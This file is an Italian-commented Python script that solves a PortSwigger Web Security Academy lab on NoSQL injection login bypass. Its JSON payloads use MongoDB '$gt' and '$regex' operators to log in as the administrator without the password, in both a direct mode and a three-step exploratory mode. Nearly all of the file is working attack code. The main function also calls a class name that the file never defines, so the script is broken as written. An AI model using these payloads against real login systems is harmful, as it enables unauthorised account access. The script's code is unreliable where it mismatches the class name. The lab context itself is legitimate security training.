"""
    RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
    In modalità esplorazione (3 step) e singola request
"""
import requests
import sys
import json
from urllib.parse import urljoin
from base_exploit import BaseNoSQLExploit, print_error, print_success, print_info

# ==================== CONFIGURAZIONE ====================
LAB_ID = "INSERT_YOUR_LAB_ID_HERE"
BASE_URL = f"https://{LAB_ID}.web-security-academy.net"

# ==================== COSTANTI ====================
SUCCESS_INDICATORS = ["My account", "Log out"]
ADMIN_INDICATORS = ["administrator", "admin"]

# ==================== EXPLOIT CLASS ====================
class OperatorInjToBypassAuthentication(BaseNoSQLExploit):
    """Exploit per NoSQL Injection Authentication Bypass."""
    
    def __init__(self, lab_id):
        super().__init__(lab_id)
    
    def _is_login_successful(self, response):
        """Verifica se il login è riuscito analizzando la risposta."""
        if response.status_code != 200:
            return False
        return any(indicator in response.text for indicator in SUCCESS_INDICATORS)
    
    def _identify_logged_user(self, response_text):
        """Identifica l'utente loggato dalla risposta."""
        response_lower = response_text.lower()
        if any(indicator in response_lower for indicator in ADMIN_INDICATORS):
            return "ADMINISTRATOR"
        elif "wiener" in response_lower:
            return "wiener"
        return "utente sconosciuto"
    
    def nosql_login(self, payload, description):
        """Esegue un tentativo di login con payload NoSQL injection."""
        print_info(f"\n{description}")
        print(f"Payload: {json.dumps(payload, indent=2)}")
        
        try:
            # Usa metodo della classe base
            response = self.send_json_login(
                username=payload.get("username"),
                password=payload.get("password")
            )
            
            if not response:
                return False
            
            if self._is_login_successful(response):
                print_success("\nLogin riuscito!")
                user = self._identify_logged_user(response.text)
                print_success(f"Loggato come: {user}")
                return True
            else:
                print_error(f"Login fallito (Status: {response.status_code})")
                return False
                
        except Exception as e:
            print_error(f"Errore durante il login: {e}")
            return False
    
    def solve_lab(self):
        """Risolve il lab con la sequenza corretta di exploit."""
        print("\n" + "="*60)
        print("SOLUZIONE LAB: NoSQL Injection Authentication Bypass")
        print("="*60)
        
        # Payload che bypassa l'autenticazione:
        # - $regex trova username che inizia con 'admin'
        # - $gt confronta password con stringa vuota (sempre true)
        payload_admin = {
            "username": {"$regex": "admin.*"},
            "password": {"$gt": ""}
        }
        
        success = self.nosql_login(
            payload_admin,
            "Login come administrator usando NoSQL regex injection"
        )
        
        if success:
            return self.verify_solution()
        else:
            print_error("\n[-] Exploit fallito")
            return False
    
    def explore_vulnerability(self):
        """Esplora la vulnerabilità NoSQL injection con diversi approcci."""
        print("\n" + "="*60)
        print("ESPLORAZIONE VULNERABILITÀ")
        print("="*60)

        # STEP 1: Username qualsiasi + password fissa
        print("\nSTEP 1 - Test: Bypass senza conoscere lo username")
        payload1 = {
            "username": {"$gt": ""},  # Qualsiasi username
            "password": "peter"        # Password fissa
        }
        self.nosql_login(payload1, "Tentativo con $gt per username")
        self.session = requests.Session()  # Reset sessione
        
        # STEP 2: Username noto + password qualsiasi
        print("\nSTEP 2 - Test: Bypass conoscendo solo lo username")
        payload2 = {
            "username": "wiener",       # Username noto
            "password": {"$gt": ""}     # Qualsiasi password
        }
        self.nosql_login(payload2, "Tentativo con $gt per password")
        self.session = requests.Session()  # Reset sessione

        # STEP 3: Regex per admin + password qualsiasi
        print("\nSTEP 3 - Test: Login come administrator")
        payload3 = {
            "username": {"$regex": "admin.*"},  # Regex per trovare admin
            "password": {"$gt": ""}             # Qualsiasi password
        }
        self.nosql_login(payload3, "Tentativo con regex per trovare admin")
    
    def verify_solution(self):
        """Verifica se il lab è stato risolto"""
        print_info("\nVerifica soluzione del lab...")
        
        try:
            response = self.session.get(self.base_url)
            
            if "Congratulations, you solved the lab!" in response.text:
                print_success("\n" + "="*60)
                print_success("LAB RISOLTO CON SUCCESSO!")
                print_success("="*60)
                return True
            else:
                print_error("Lab non ancora risolto")
                return False
                
        except Exception as e:
            print(f"Errore verifica: {e}")
            return False

def main():
    """Funzione principale per l'esecuzione dell'exploit."""
    # Validazione configurazione
    if not BaseNoSQLExploit.validate_lab_id(LAB_ID):
        sys.exit(1)
    
    exploit = NoSQLInjectionExploit(LAB_ID)
    
    # Verifica connettività
    if not exploit.check_lab_status():
        sys.exit(1)

    # Menu di scelta
    print("\nVuoi vedere l'esplorazione progressiva della vulnerabilità?")
    print("    1 - Risolvi direttamente il lab")
    print("    2 - Mostra esplorazione step-by-step e poi risolvi")
    
    choice = input("\nScelta [1/2] (default=1): ").strip() or "1"
    
    # Modalità esplorazione
    if choice == "2":
        exploit.explore_vulnerability()
        print("\n" + "="*60)
        print("Procedo con la soluzione finale...")
        print("="*60)
        # Reset sessione per soluzione pulita
        exploit.session = exploit.session.__class__()
        exploit.session.headers.update({"User-Agent": "Mozilla/5.0 (NoSQLi-Solver)"})
    
    # Risoluzione lab
    if not exploit.solve_lab():
        sys.exit(1)

if __name__ == "__main__":
    main()